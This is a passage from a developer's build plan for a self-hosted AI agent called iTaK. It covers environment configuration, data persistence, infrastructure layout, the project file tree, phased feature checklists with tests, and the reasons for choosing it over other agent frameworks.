No more SSH-into-server update rituals:

1. Dashboard shows **"Update Available"** banner when a new version is detected
2. Click **"Update"** → system pulls new image, migrates data, restarts container
3. If something breaks → click **"Rollback"** to revert to previous version
4. Built-in **Backup & Restore** (like Agent Zero) - snapshot all settings, memory, and config

### 28.6 - Environment Variable Configuration

For automated deployments (CI/CD, VPS, scripted setups):

```env
# .env - override any setting without touching the UI
ITAK_CHAT_MODEL=openrouter/anthropic/claude-sonnet-4-5
ITAK_UTILITY_MODEL=ollama/qwen2.5:7b
ITAK_EMBEDDING_MODEL=nomic-embed-text
ITAK_DISCORD_TOKEN=your_bot_token
ITAK_TELEGRAM_TOKEN=your_telegram_token
ITAK_OWNER_ID=discord:776628215066132502
ITAK_LOG_ROTATION_HOURS=24
ITAK_NEO4J_URI=bolt://neo4j:7687
ITAK_WEAVIATE_URL=http://weaviate:8080
ITAK_SEARXNG_URL=http://searxng:8080
```

**Priority:** `.env` values are defaults. Once saved via the dashboard, `config.json` takes precedence (matching Agent Zero's behavior).

### 28.7 - Data Persistence

All user data lives in one mapped directory:

```
~/itak-data/                    # Mapped via Docker volume
├── config.json                 # All settings (LLM, adapters, etc.)
├── users.json                  # User registry
├── memory/                     # Markdown memory tier
├── db/                         # SQLite databases
├── rooms/                      # Per-room workspaces
├── logs/                       # 24hr rotated JSONL logs
└── skills/                     # Custom skills
```

**Golden rule:** Never touch application code. Only `data/` is user-writable. Survives container updates and rebuilds.

### 28.8 - Mobile Access

Two options for accessing iTaK from your phone:

**Option 1: Built-in Tunnel (recommended)**
- One click in the dashboard → generates a secure HTTPS URL via Cloudflare Tunnel
- Access from anywhere: `https://your-tunnel-url.trycloudflare.com`
- Always set a password in Settings first!

**Option 2: Local Network**
- Access from any device on your network: `http://<your-ip>:50001`
- Find your IP: `ipconfig` (Windows) or `ip addr` (Linux/Mac)

---

## Infrastructure Map

```
┌─────────────────────────────────────────────────────────────────┐
│                         YOUR VPS                                │
│                                                                 │
│  ┌─────────┐  ┌─────────┐  ┌──────────┐  ┌──────────────────┐ │
│  │  Neo4j  │  │Weaviate │  │ SearXNG  │  │  iTaK Agent    │ │
│  │  :7687  │  │  :8080  │  │  :8888   │  │  (Python + Cron) │ │
│  │ GraphDB │  │ VectorDB│  │  Search  │  │  Heartbeat 30min │ │
│  └─────────┘  └─────────┘  └──────────┘  └──────────────────┘ │
│                                                                 │
│  ┌─────────┐  ┌────────────────────────────────────────────┐   │
│  │  Caddy  │  │           Docker Engine                    │   │
│  │ (reverse│  │  (sandbox for code execution)              │   │
│  │  proxy) │  │                                            │   │
│  └─────────┘  └────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
        │                                    │
        │ SSH / API                          │ Discord API
        │                                    │
┌───────┴───────────────┐           ┌────────┴────────────┐
│  iTaK Dell Mini PC  │           │   David's Devices   │
│   (192.168.0.217)     │           │   (Discord client)  │
│                       │           │                     │
│  ┌─────────────────┐  │           │  Phone / Desktop /  │
│  │     Ollama      │  │           │  Laptop - anywhere  │
│  │  Local Models   │  │           │                     │
│  │  + Embeddings   │  │           └─────────────────────┘
│  │  + Steering     │  │
│  └─────────────────┘  │
└───────────────────────┘
```

---

## Project Structure (Target: ~3,500 lines)

```
iTaK/
├── gameplan.md                    # THIS FILE
├── config.json                    # All configuration (models, adapters, secrets)
├── main.py                        # Entry point
│
├── webui/                         # Web dashboard (Agent Zero-style)
│   ├── index.html                 # Main dashboard page
│   ├── index.css                  # Dashboard styles
│   ├── index.js                   # Dashboard logic (Alpine.js)
│   ├── login.html                 # Auth page
│   └── components/
│       ├── chat/                  # Chat interface
│       ├── settings/              # Settings tabs (agent, skills, MCP, etc.)
│       ├── sidebar/               # Navigation sidebar
│       └── modals/                # File browser, popups
│
├── core/
│   ├── agent.py                   # Agent class + monologue loop (~300 lines)
│   ├── history.py                 # Topic-based history compression (~200 lines)
│   ├── models.py                  # Multi-model router (~100 lines)
│   ├── extensions.py              # Extension hook system (~150 lines)
│   ├── logger.py                  # Structured logging engine - 14 types, 24hr rotation (~200 lines)
│   ├── progress.py                # ProgressTracker - anti-silence updates (~80 lines)
│   ├── checkpoint.py              # State checkpointing - crash recovery (~60 lines)
│   └── task_board.py              # SQLite task tracking - Kanban board (~150 lines)
│
├── memory/
│   ├── SOUL.md                    # Agent personality
│   ├── USER.md                    # David's profile
│   ├── MEMORY.md                  # Key facts + decisions
│   ├── AGENTS.md                  # Behavioral rules
│   ├── HEARTBEAT.md               # Proactive task definitions
│   ├── daily/                     # Session logs
│   ├── manager.py                 # Memory orchestrator (~200 lines)
│   ├── sqlite_store.py            # SQLite + BM25 + basic vectors (~150 lines)
│   ├── neo4j_store.py             # Neo4j graph operations (~200 lines)
│   ├── weaviate_store.py          # Weaviate vector search (~150 lines)
│   └── ranker.py                  # Cross-store result merging (~100 lines)
│
├── tools/
│   ├── code_execution.py          # Python/Node/Shell executor (~300 lines)
│   ├── memory_load.py             # Search across all memory layers
│   ├── memory_save.py             # Store new memories
│   ├── web_search.py              # SearXNG integration
│   ├── browser_agent.py           # browser-use + Playwright Chromium
│   ├── call_subordinate.py        # Sub-agent spawning
│   ├── knowledge_tool.py          # Reusable knowledge files
│   ├── deploy_project.py          # Auto-deploy to VPS (Dokploy/Caddy/Docker)
│   └── response.py                # Final response (breaks loop)
│
├── adapters/
│   ├── base.py                    # Adapter interface / base class (~50 lines)
│   ├── discord.py                 # Discord adapter (~200 lines)
│   ├── telegram.py                # Telegram adapter (~180 lines)
│   ├── slack.py                   # Slack adapter (~180 lines)
│   └── cli.py                     # Terminal adapter (~100 lines)
│
├── skills/
│   ├── SKILL.md                   # Meta-skill: how to create skills
│   ├── code_execution.md
│   ├── web_research.md
│   ├── polymarket_trading.md
│   ├── os_linux.md                # Linux commands reference
│   ├── os_macos.md                # macOS commands reference
│   ├── os_windows.md              # Windows/PowerShell commands reference
│   └── ...
│
├── prompts/
│   ├── agent.system.main.md       # Main system prompt (modular includes)
│   ├── agent.system.main.role.md
│   ├── agent.system.main.solving.md
│   ├── agent.system.tool.*.md     # Auto-discovered tool prompts
│   ├── browser_agent.system.md    # Browser agent system prompt
│   └── profiles/                  # Sub-agent specialization profiles
│
├── extensions/
│   ├── agent_init/
│   ├── before_main_llm_call/
│   ├── tool_execute_after/
│   │   ├── code_quality.py        # Auto-lint after code writes
│   │   ├── visual_test.py         # Screenshot UI + send to user
│   │   ├── self_heal.py           # Auto-fix tool failures
│   │   └── task_progress.py       # Update task step on tool completion
│   ├── message_loop_start/
│   │   └── task_tracker.py        # Auto-create task on new request
│   ├── process_chain_end/
│   │   └── task_complete.py       # Move task to review/done
│   └── ... (24 hook directories)
│
├── helpers/
│   ├── mcp_handler.py             # MCP client (connect to external MCP servers)
│   ├── mcp_server.py              # MCP server (expose iTaK as FastMCP tool)
│   ├── a2a_server.py              # A2A protocol server (agent-to-agent)
│   └── webhook_handler.py         # Inbound/outbound webhook handler (n8n/Zapier)
│
├── lib/
│   └── browser/
│       └── init_override.js       # JS injection for cookie/consent handling
│
├── heartbeat/
│   ├── scheduler.py               # Cron-based heartbeat (~100 lines)
│   └── integrations/
│       ├── discord.py             # Check mentions, events
│       ├── github.py              # PR notifications
│       └── polymarket.py          # Position monitoring
│
├── security/
│   ├── secrets.py                 # Secret store (names visible, values hidden)
│   ├── skill_scanner.py           # Skill/tool security vetting
│   ├── sandbox.py                 # Docker execution sandbox
│   ├── permissions.py             # Permission checker - 3-level RBAC (~100 lines)
│   └── rate_limiter.py            # Token consumption control
│
├── Dockerfile                     # Main agent container
├── docker-compose.yml             # Full stack (agent + Neo4j + Weaviate + SearXNG)
├── requirements.txt               # Python dependencies (pinned versions)
├── .env.example                   # Environment variable template
├── users.json                     # User registry (permissions, §21)
│
├── data/                          # All user data (Docker volume mount)
│   ├── rooms/                     # Per-room workspaces (§22)
│   ├── logs/                      # 24hr rotated JSONL logs (§20)
│   └── db/                        # SQLite databases
│
└── tests/
    ├── test_logger.py             # Logging engine tests
    ├── test_permissions.py        # Permission system tests
    ├── test_rooms.py              # Multi-room isolation tests
    ├── test_continuity.py         # Conversation persistence tests
    └── test_memory.py             # Memory tier tests
```

---

## Build Phases

### Phase 1: Foundation (Week 1)

**Goal:** Basic agent that can chat, remember, use tools, browse the web, write clean code, and keep you updated.

- [ ] `config.json` - model endpoints, Discord token, Neo4j creds
- [ ] `core/agent.py` - basic monologue loop (simplified Agent Zero pattern)
- [ ] `core/models.py` - multi-model router (chat + utility + browser + embeddings)
- [ ] `core/progress.py` - ProgressTracker class (plan → step updates → completion)
- [ ] `core/checkpoint.py` - state checkpointing to disk (crash recovery)
- [ ] `memory/SOUL.md`, `USER.md`, `MEMORY.md`, `AGENTS.md` - initial content
- [ ] `memory/sqlite_store.py` - SQLite + basic embedding search
- [ ] `memory/manager.py` - unified memory interface
- [ ] `tools/response.py` - final response tool
- [ ] `tools/memory_load.py` + `memory_save.py` - read/write memories
- [ ] `tools/code_execution.py` - basic Python/Shell execution
- [ ] `tools/browser_agent.py` - browser-use + Playwright (shipped out of the box)
- [ ] `lib/browser/init_override.js` - cookie/consent handling JS injection
- [ ] Docker sandbox with linters pre-installed (ruff, mypy, bandit, semgrep, eslint, shellcheck)
- [ ] Docker restart policy (`unless-stopped`) + health check
- [ ] `extensions/tool_execute_after/code_quality.py` - auto-lint after code writes
- [ ] `extensions/agent_init/os_detect.py` - first-launch OS detection (host + sandbox)
- [ ] `skills/os_linux.md`, `os_macos.md`, `os_windows.md` - OS command references
- [ ] `webui/` - Agent Zero-style web dashboard (Alpine.js + FastAPI)
- [ ] Dashboard: Agent Settings tab with all 4 model configs (LiteLLM providers)
- [ ] Dashboard: Chat interface with streaming responses + live progress display
- [ ] Dashboard: Login/auth page + random 5-digit port + deployment mode selector
- [ ] Dashboard: Responsive layout (desktop/tablet/mobile)
- [ ] `adapters/base.py` - shared adapter interface with progress message editing
- [ ] `adapters/discord.py` - Discord bot with thread support + progress edits
- [ ] `adapters/telegram.py` - Telegram bot (polling mode) + progress edits
- [ ] `adapters/slack.py` - Slack bot (Socket Mode)
- [ ] `adapters/cli.py` - terminal interface with spinner progress
- [ ] "Remember this" system - trigger detection + summarization + 4-layer storage
- [ ] "Forget This" system - delete memory from all 4 tiers with user confirmation
- [ ] Auto-remember extension hook (`message_loop_end/auto_remember.py`)
- [ ] Anti-silence protocol - immediate plan reply, step-by-step updates
- [ ] Test: iTaK writes Python → auto-lint catches a bug → agent fixes it → clean
- [ ] Test: iTaK browses a website → extracts data → reports back
- [ ] Test: First launch detects OS correctly → stores in memory → uses right commands
- [ ] Test: Ask iTaK to do a multi-step task → verify progress updates stream to Discord
- [ ] Test: Kill iTaK mid-task → verify it restarts and resumes from checkpoint
- [ ] Test: Chat with iTaK via Discord, say "remember this", verify it's stored
- [ ] Test: Save something on Telegram, ask about it on Discord - cross-adapter memory
- [ ] `core/logger.py` - structured logging engine with 14 event types, 24hr rotation, SQLite dual-write
- [ ] `Dockerfile` + `docker-compose.yml` + `requirements.txt` + `.env.example`
- [ ] `tests/` directory with pytest setup
- [ ] `/logs` command in all adapters (view, search, filter, cost)
- [ ] Test: Verify log entries are written to both JSONL and SQLite
- [ ] Test: Verify 24hr log rotation creates new file at midnight UTC
- [ ] Test: Verify secret masking - API keys never appear in logs

### Phase 2: Intelligence + Security (Week 2)

**Goal:** Deep memory with Neo4j + Weaviate, heartbeat, skills, and security hardening.

- [ ] `memory/neo4j_store.py` - connect to VPS Neo4j, entity extraction, graph queries
- [ ] `memory/weaviate_store.py` - deploy Weaviate on VPS, hybrid vector search
- [ ] `memory/ranker.py` - merge results from all 3 stores
- [ ] `core/history.py` - topic-based compression (Agent Zero pattern)
- [ ] `heartbeat/scheduler.py` - 30-min cron heartbeat
- [ ] `heartbeat/integrations/discord.py` - check mentions
- [ ] `skills/SKILL.md` - meta-skill with memory-first discovery pipeline
- [ ] Memory-first skill discovery - Neo4j → SQLite → Weaviate → web fallback chain
- [ ] `security/secrets.py` - secret store implementation
- [ ] `extensions/tool_execute_after/visual_test.py` - screenshot-based UI verification for web features
- [ ] `security/skill_scanner.py` - regex + LLM + network policy security scanner
- [ ] Tool prompt auto-discovery (`agent.system.tool.*.md` glob pattern)
- [ ] Test: Ask iTaK for a skill it doesn't have → verify it checks Neo4j/memory first
- [ ] Test: Feed iTaK a malicious skill → verify security scanner blocks it
- [ ] `core/task_board.py` - SQLite-backed task tracking (CRUD + status transitions)
- [ ] Dashboard: Mission Control tab - Kanban task board (INBOX → IN PROGRESS → REVIEW → DONE)
- [ ] `/tasks` command for Discord/Telegram - view and manage tasks from chat
- [ ] `extensions/message_loop_start/task_tracker.py` - auto-create task on new request
- [ ] `extensions/tool_execute_after/task_progress.py` - update task step on tool completion
- [ ] `extensions/process_chain_end/task_complete.py` - move task to review/done
- [ ] `helpers/mcp_handler.py` - MCP client (connect to external MCP servers, JSON config)
- [ ] `helpers/mcp_server.py` - MCP server (expose iTaK as tool via FastMCP SSE)
- [ ] `helpers/a2a_server.py` - A2A protocol server (agent-to-agent discovery + delegation)
- [ ] Dashboard: MCP/A2A tab - external servers config, iTaK server toggle, A2A settings
- [ ] Test: Give iTaK 3 tasks in a row → verify all tracked in task board
- [ ] Test: Type `/tasks` on Discord → see Kanban summary with progress bars
- [ ] Test: Connect an MCP server (e.g., filesystem) → verify iTaK auto-discovers tools
- [ ] Test: Call iTaK via its MCP server endpoint from another tool
- [ ] `security/permissions.py` - 3-level RBAC (owner/sudo/user) with per-tool checks
- [ ] `users.json` - user registry with platform-based identification
- [ ] Multi-room support - `data/rooms/` + session key routing + per-room isolation
- [ ] Dashboard: Users tab (add/remove, role mgmt, rate limits, activity stats)
- [ ] Dashboard: Rooms tab (see all rooms, jump into conversations)
- [ ] Dashboard: Logs tab (real-time stream, filters, FTS5 search, token costs)
- [ ] Test: Regular user tries to create a file → verify blocked with friendly message
- [ ] Test: Sudo user creates a file → verify allowed
- [ ] Test: Message in Discord #general + DM → verify separate room workspaces
- [ ] Test: "Remember this" in Discord → ask about it in Telegram → verify found

### Phase 3: Power + Self-Healing (Week 3)

**Goal:** Multi-agent delegation, self-healing, extension hooks, browser automation, agent swarms.

- [ ] `core/extensions.py` - 24-point extension hook system
- [ ] `core/self_heal.py` - self-healing engine (classify → memory → reason → research → learn)
- [ ] `extensions/tool_execute_after/self_heal.py` - hook into tool failures
- [ ] `extensions/error_format/error_classifier.py` - repairable vs critical classification
- [ ] `extensions/process_chain_end/error_log.py` - log all errors to Neo4j
- [ ] `tools/call_subordinate.py` - spawn specialized sub-agents with profile support
- [ ] `prompts/profiles/` - researcher, coder, trader, debugger, writer, devops, security profiles
- [ ] `prompts/profiles/custom/` - user-defined custom agent profiles (via dashboard)
- [ ] Agent swarm coordinator - parallel sub-agent execution with merge strategies
- [ ] Dashboard: Agent Profiles tab - create, edit, clone, delete custom agent profiles
- [ ] `tools/browser.py` - headless browser automation
- [ ] `tools/web_search.py` - SearXNG integration
- [ ] `security/sandbox.py` - Docker sandbox for code execution
- [ ] `security/rate_limiter.py` - token consumption controls
- [ ] Self-modification: iTaK can add features to itself (with security scan gate)
- [ ] `tools/deploy_project.py` - auto-deploy tool (Dokploy, Caddy, Docker, static)
- [ ] Caddy auto-config: iTaK creates subdomain entries for deployed projects
- [ ] Dokploy API integration (optional - for users who have Dokploy on VPS)
- [ ] `/api/webhook` - inbound webhook endpoint for n8n/Zapier to trigger iTaK
- [ ] Outbound webhook system - iTaK calls n8n/Zapier on task_completed, error_critical
- [ ] Dashboard: Integrations section - n8n/Zapier webhook URLs, event toggles
- [ ] Test: Deliberately break a dependency → verify iTaK auto-heals
- [ ] Test: Simulate Neo4j down → verify iTaK restarts the container
- [ ] Test: "Research X, write code for Y, deploy it" - multi-agent chain
- [ ] Test: "Build me a landing page" → verify iTaK deploys + gives live URL
- [ ] Test: Spawn 3 sub-agents in parallel → verify swarm coordination + merge
- [ ] Test: n8n sends webhook to iTaK → verify task created and executed

### Phase 4: Advanced (Week 4+)

**Goal:** Steering vectors, proactive behaviors, MemGPT memory management, polish.

- [ ] LLM steering vectors for personality (local models on iTaK)
- [ ] Proactive pattern learning (Mimubot's vision, better execution)
- [ ] GitHub integration for heartbeat
- [ ] Polymarket position monitoring
- [ ] Advanced Neo4j temporal queries
- [ ] Self-healing knowledge base review - audit stored fixes for accuracy
- [ ] `core/memory_manager.py` - MemGPT-style memory pressure management (auto-swap tiers)
- [ ] Memory Tier 1↔2 auto-swap - page recall memory in/out of context on pressure
- [ ] Memory Tier 2↔3 auto-swap - archive recall to Neo4j/Weaviate when stale
- [ ] External data source RAG - chunk + embed uploaded files on demand (Tier 4)
- [ ] Additional adapters if needed (Matrix, WhatsApp, Email)
- [ ] Test: Fill context window → verify auto-archival to Tier 2 + 3
- [ ] Test: Ask about old conversation → verify recall from Tier 3 (archival)
- [ ] Conversation continuity - JSONL append-only transcripts + SQLite + crash-safe fsync
- [ ] Session resumption - reload room context on restart with injected summary
- [ ] Cross-adapter session linking - same user across platforms sees shared memory
- [ ] Conversation archival - auto-summarize after 7 days, migrate to Tier 3 after 30
- [ ] Agent log self-review - extension hook injects recent errors into agent context
- [ ] First-launch setup wizard (5 steps: name, LLM, platform, services, ready)
- [ ] One-click update system (pull new image, migrate data, rollback button)
- [ ] Test: Kill iTaK mid-conversation → restart → verify room context restored
- [ ] Test: Say "forget this" about a stored memory → verify deleted from all tiers
- [ ] Test: Verify first-launch wizard correctly creates config.json + users.json
- [ ] Test: Verify setup wizard auto-detects local Ollama models

---

## Key Design Decisions

### Why Not Just Use OpenClaw?

1. **Security**: One-click RCE, ClawHub malicious packages, plain-text creds
2. **Size**: 430K lines nobody understands vs ~3,500 we control
3. **Cost**: Burns tokens on everything with no model delegation
4. **Customization**: We want Neo4j + Weaviate + Polymarket + Discord - not what OpenClaw provides
5. **Learning**: Building it = understanding it = controlling it

### Why Not Just Use Agent Zero?

1. **We ARE using Agent Zero's patterns** - the loop, hooks, history, multi-agent, tools
2. But we strip the UI (we use Discord), simplify the codebase, add our memory stack
3. Agent Zero is ~38K lines in the core alone - we want ~3,500

### Why Not Just Use Nanobot?

1. Too simple - no multi-model, no graph memory, no extension system
2. But we steal its simplicity: pip-installable, config.json, gateway pattern

### Why Both Neo4j AND Weaviate?

- **Neo4j** = relationships ("What projects use Docker?")
- **Weaviate** = semantic similarity ("Find things like 'deployment patterns'")
- **Together** = GraphRAG ("Find similar patterns AND show me how they relate to my projects")
- SQLite still does the heavy lifting for fast retrieval - Neo4j and Weaviate are the brain upgrades

---

## Research Sources

This gameplan synthesizes insights from:

1. **Agent Zero** - Full codebase deep dive (1,008 lines core, 84 helpers, 23 tools, 102 prompts, 24 extension hooks)
2. **Cole Medin** - "I Built a Safer OpenClaw Alternative Using Claude Code" (YouTube)
3. **Agent Zero VPS Tutorial** - Official channel (David + Nick), models, secrets, projects, free inference
4. **LLM Steering Vectors** - Hugging Face / neuroscience-inspired research video
5. **Nanoclaw** - ~500 lines, self-modification, Claude SDK, Apple Containers
6. **Nanobot** - 3,500 lines, Ollama integration, Telegram, pip install
7. **Mimubot** - Proactive theory-of-mind concept (vision good, execution failed in tests)
8. **Julian / AI Profit Boardroom** - Side-by-side comparisons, real-world testing
9. **David's Existing Infrastructure** - VPS, Neo4j, Discord, Ollama on iTaK, SearXNG
10. **Weaviate** - Open-source AI-native vector database research
